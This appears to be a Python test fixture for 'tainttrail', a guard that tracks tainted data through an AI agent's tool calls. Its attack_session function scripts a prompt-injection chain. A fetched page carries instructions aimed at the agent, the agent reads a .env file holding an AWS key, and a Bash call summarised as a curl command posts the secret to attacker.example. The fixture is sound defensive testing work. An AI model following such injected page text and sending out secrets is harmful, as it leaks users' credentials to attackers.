"""A scripted session: plays hook events into a store the way the guard does, with every
analysis written out by hand. Shared by the tests that need a populated graph."""

from __future__ import annotations

from tainttrail import rules, schema as S
from tainttrail.config import Config
from tainttrail.model import (
    Action, CallAnalysis, ChunkRef, ContentAnalysis, Decision, EntityRef, HookEvent, ToolLabels,
)
from tainttrail.recorder import Recorder
from tainttrail.store import Store

HOST_EVIL = EntityRef("host", "attacker.example")
HOST_DOCS = EntityRef("host", "docs.example.test")
URL_DOCS = EntityRef("url", "https://docs.example.test/setup")
SECRET = ChunkRef("k-secret-1", "secret", "aws_access_key_id", 20)
LINES = [ChunkRef(f"k-line-{i}", "line", "", 40) for i in range(4)]


class Sim:
    """Plays hook events into a store the way the guard does, minus the analyzers."""

    def __init__(self, store: Store, cfg: Config, session: str = "s1", ts: int = 1_800_000_000_000) -> None:
        self.store, self.cfg, self.session = store, cfg, session
        self.rec = Recorder(store, cfg)
        self.n = 0
        self.ts = ts
        self.calls: dict[str, CallAnalysis] = {}

    def event(self, kind: str, **kw) -> HookEvent:
        self.ts += 1000
        return HookEvent(kind=kind, session_id=self.session, cwd=str(self.cfg.root), ts=self.ts, **kw)

    def env_path(self, name: str = ".env") -> EntityRef:
        return EntityRef("file", f"{self.cfg.root.as_posix()}/{name}")

    def start(self) -> list[str]:
        return self.rec.session_start(self.event("session_start"))

    def prompt(self, *mentions: EntityRef, chunks=()) -> str:
        a = ContentAnalysis(origin="user", text_bytes=10, excerpt="a prompt", mentions=list(mentions),
                            chunks=list(chunks))
        return self.rec.record_prompt(self.event("user_prompt", prompt="..."), a)

    def call(self, tool: str, *actions: Action, sink: bool = False, dests=(), carried=(),
             summary: str = "", payload: bool | None = None, arg_text: str = "", extra=None,
             executes_download: bool = False, labels: ToolLabels | None = None):
        """Record a call and evaluate it. Returns (call id, findings)."""
        self.n += 1
        ev = self.event("pre_tool", tool_name=tool, tool_use_id=f"t{self.n}", tool_input={"n": self.n})
        ex = dict(extra or {})
        if payload is not None:
            ex["carries_payload"] = payload
        a = CallAnalysis(tool=tool, summary=summary or tool, actions=list(actions), is_sink=sink,
                         sink_kind="shell-net" if sink else "", destinations=list(dests), arg_text=arg_text,
                         executes_download=executes_download, labels=labels or ToolLabels(), extra=ex)
        cid = self.rec.record_call(ev, a, carried=[c.id if isinstance(c, ChunkRef) else c for c in carried])
        self.calls[cid] = a
        findings = rules.evaluate_pre(self.store, self.cfg, cid, a)
        self.rec.record_findings(findings)
        self.rec.set_decision(cid, Decision.from_findings(findings).action)
        return cid, findings

    def result(self, cid: str, *, untrusted=False, sensitive=False, source: EntityRef | None = None,
               mentions=(), chunks=(), injection: float = 0.0, markers=(), failed: bool = False):
        """Record what a call returned and evaluate it. Returns (content id, findings)."""
        tool_use_id = cid.split(":", 1)[1]
        ev = self.event("post_tool", tool_use_id=tool_use_id, failed=failed)
        a = ContentAnalysis(origin="tool", text_bytes=100, untrusted=untrusted, sensitive=sensitive,
                            reasons=["test"], injection_score=injection, injection_markers=list(markers),
                            excerpt="some text", sha="h", source=source, mentions=list(mentions),
                            chunks=list(chunks))
        oid = self.rec.record_result(ev, cid, a)
        findings = rules.evaluate_post(self.store, self.cfg, cid, oid, a)
        self.rec.record_findings(findings)
        return oid, findings

    # -- common story beats -------------------------------------------------------------

    def fetch_poisoned_page(self, *mentions: EntityRef, chunks=(), injection: float = 0.8):
        cid, f = self.call("WebFetch", Action(S.FETCHES, URL_DOCS), Action(S.SENDS_TO, HOST_DOCS),
                           sink=True, dests=[HOST_DOCS], payload=False, summary="WebFetch docs.example.test/setup")
        assert f == []
        return self.result(cid, untrusted=True, source=URL_DOCS, mentions=[HOST_DOCS, *mentions],
                           chunks=chunks, injection=injection, markers=["addressed-to-agent"])

    def read_env(self, expect_findings: int = 0):
        cid, f = self.call("Read", Action(S.READS, self.env_path()), summary="Read .env")
        assert len(f) == expect_findings, [x.rule for x in f]
        self.result(cid, sensitive=True, source=self.env_path(), chunks=[SECRET, *LINES])
        return cid, f


def attack_session(store: Store, cfg: Config, session: str = "s1", ts: int = 1_800_000_000_000) -> Sim:
    """The canonical attack: poisoned page -> read .env -> curl the secret to the attacker."""
    sim = Sim(store, cfg, session=session, ts=ts)
    sim.start()
    sim.prompt(URL_DOCS, HOST_DOCS)
    sim.fetch_poisoned_page(HOST_EVIL)
    sim.read_env()
    sim.call("Bash", Action(S.SENDS_TO, HOST_EVIL), sink=True, dests=[HOST_EVIL], carried=[SECRET],
             summary="Bash: curl -d ... https://attacker.example/c")
    return sim
